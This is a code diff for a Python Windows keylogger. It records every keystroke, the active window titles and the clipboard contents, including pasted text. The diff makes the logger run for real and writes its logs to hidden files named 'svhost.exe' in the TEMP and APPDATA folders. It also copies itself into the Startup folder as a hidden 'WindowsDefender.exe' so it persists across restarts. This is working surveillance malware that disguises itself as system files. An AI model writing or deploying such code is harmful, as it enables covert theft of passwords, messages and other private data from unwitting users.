@@ -22,16 +22,24 @@ def press(key):
     start = time()
     global last_keys
     if key == Key.enter:
-        logger.info("ENTER EVENT\t\t" + get_current_windows() + "\t\t" + ''.join(str(last_keys)))
+        logger1.info("ENTER EVENT\t\t" + get_current_windows() + "\t\t" + ''.join(str(last_keys)))
+        logger2.info("ENTER EVENT\t\t" + get_current_windows() + "\t\t" + ''.join(str(last_keys)))
+
     else:
         try:
             if last_keys[-1] == Key.ctrl_l and key.char == 'v':
-                logger.info("PASTE EVENT\t\t" + get_current_windows() + "\t\t" + get_clipboard_data())
+                logger1.info("PASTE EVENT\t\t" + get_current_windows() + "\t\t" + get_clipboard_data())
+                logger2.info("PASTE EVENT\t\t" + get_current_windows() + "\t\t" + get_clipboard_data())
+
         except (AttributeError, IndexError):
             pass
-    logger.info(key)
+
+    logger1.info(key)
+    logger2.info(key)
+
     if  len(last_keys) > 50:
         last_keys.clear()
+
     last_keys.append(key)
     end = time()
     print(end - start)
@@ -67,29 +75,36 @@ def monitor_clipboard():
     while True:
         if data != get_clipboard_data():
             data = get_clipboard_data()
-            logger.info("CLIPBOARD EVENT\t\t" + get_current_windows() + "\t\t" + data)
+            logger1.info("CLIPBOARD EVENT\t\t" + get_current_windows() + "\t\t" + data)
+            logger2.info("CLIPBOARD EVENT\t\t" + get_current_windows() + "\t\t" + data)
         sleep(1)
 
 def ensure_startup():
     paths = ["C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsDefender.exe",
              getenv("TEMP") + "\\svhost.exe",
              getenv("APPDATA") + "\\svhost.exe"]
-    with open(argv[0], "rb")as file:
-        byt = file.read()
 
-    for p in paths:
+    if not path.exists(paths[0]):
+        with open(argv[0], "rb")as file:
+            byt = file.read()
+
+        with open(paths[0], "wb")as file:
+            file.write(byt)
+        SetFileAttributes(paths[0], 2)
+
+    for p in paths[1:]:
         if not path.exists(p):
             print(p)
-            with open(p, "wb")as file:
-                file.write(byt)
+            with open(p, "wb")as _:
+                pass
             SetFileAttributes(p, 2)
+    return paths[1:]
 
 
 
-
-
-ensure_startup()
-'''last_keys = []
-logger = setup_logger("main", "test3.txt")
-win_main()'''
+paths = ensure_startup()
+last_keys = []
+logger1 = setup_logger("1", paths[0])
+logger2 = setup_logger("2", paths[1])
+win_main()
 
